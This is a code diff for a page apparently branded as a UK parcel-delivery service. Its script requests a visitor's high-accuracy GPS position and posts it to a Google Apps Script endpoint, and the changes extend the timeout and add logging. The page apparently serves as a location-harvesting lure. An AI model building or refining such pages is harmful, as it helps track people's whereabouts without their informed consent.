@@ -133,7 +133,9 @@ UK Delivery Network © 2026
 
 function getLocation(){
 
+
 const status = document.getElementById("status");
+
 
 
 if(!navigator.geolocation){
@@ -146,25 +148,40 @@ return;
 }
 
 
+
 status.innerHTML =
-"Requesting location...";
+"Getting accurate location...";
 
 
 
 navigator.geolocation.getCurrentPosition(
+
 
 function(position){
 
 
 const data = {
 
+
 latitude: position.coords.latitude,
+
 
 longitude: position.coords.longitude,
 
-accuracy: position.coords.accuracy
+
+accuracy: Math.round(position.coords.accuracy)
+
 
 };
+
+
+
+console.log("GPS Data:", data);
+
+
+
+status.innerHTML =
+"Sending location...";
 
 
 
@@ -172,17 +189,24 @@ fetch(
 "https://script.google.com/macros/s/AKfycbw7gL-hqKmdnxaiikqJsqQ8ECGpjLTlD3CSxjdC-DFdeyMH8atEjiOZ5q2PcZtPbMPX/exec",
 {
 
+
 method:"POST",
+
 
 headers:{
 
+
 "Content-Type":"text/plain"
+
 
 },
 
+
 body:JSON.stringify(data)
 
+
 }
+
 
 )
 
@@ -190,7 +214,9 @@ body:JSON.stringify(data)
 
 .then(function(response){
 
+
 return response.text();
+
 
 })
 
@@ -198,10 +224,13 @@ return response.text();
 
 .then(function(result){
 
+
 console.log(result);
+
 
 status.innerHTML =
 "✓ Location received. Thank you.";
+
 
 })
 
@@ -209,10 +238,13 @@ status.innerHTML =
 
 .catch(function(error){
 
+
 console.log(error);
+
 
 status.innerHTML =
 "Unable to send location.";
+
 
 });
 
@@ -220,29 +252,39 @@ status.innerHTML =
 },
 
 
+
 function(error){
+
 
 status.innerHTML =
 "Location permission denied.";
 
+
 },
+
 
 
 {
 
+
 enableHighAccuracy:true,
 
-timeout:10000,
+
+timeout:30000,
+
 
 maximumAge:0
 
+
 }
+
 
 
 );
 
 
 }
+
 
 </script>
 
